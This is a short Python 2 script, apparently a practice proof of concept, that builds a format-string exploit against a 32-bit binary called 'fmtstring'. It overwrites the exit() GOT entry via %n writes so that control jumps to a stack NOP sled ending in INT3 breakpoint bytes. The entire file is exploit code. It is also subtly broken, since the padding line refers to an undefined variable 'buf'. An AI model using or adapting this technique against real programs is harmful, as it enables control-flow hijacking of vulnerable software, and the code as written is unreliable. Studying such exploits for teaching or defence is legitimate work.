#!/usr/bin/python

# Should halt at the end of NOP sled at \xCC INT3.


#fmtstring:     file format elf32-i386

#DYNAMIC RELOCATION RECORDS
#OFFSET   TYPE              VALUE
# 0804b2c0 R_386_JUMP_SLOT   exit@GLIBC_2.0
w1 = '\xc0\xb2\x04\x08JUNK'
w2 = '\xc1\xb2\x04\x08JUNK'
w3 = '\xc2\xb2\x04\x08JUNK'
w4 = '\xc3\xb2\x04\x08JUNK'


# We're picking an address on the stack in this case.  The value may not be the same, so a sufficient NOP sled will increase the 'window' we have to make our mark.
b1 = 0xff
b2 = 0xce
b3 = 0xff
b4 = 0xff


n1 = 256 + b1 - 0x2f - 1
n2 = 256*2 + b2 - n1 - 0x2f - 1
n3 = 256*3 + b3 - n1 - n2 - 0x2f - 1
n4 = 256*4 + b4 - n1 - n2 - n3 - 0x2f - 1

form = '%x%x%' + str(n1) + 'x%n%' + str(n2)
form += 'x%n%' + str(n3) + 'x%n%' + str(n4) + 'x%n'


# ;;;;;;;;;;;;;;;;;;;;;;;;
# Lots of NOPS to expand the 'window' in case of stack variation
nops = "\x90" * 240

# ;;;;;;;;;;;;;;;;;;;;;;;;
# Adjust ESP to boundary
ints = '\xCC' * 24

# ;;;;;;;;;;;;;;;;;;;;;;;;;
# Padding... 
padding = 'Z' * (250 - len(buf))

print w1 + w2 + w3 + w4 + form + nops + ints
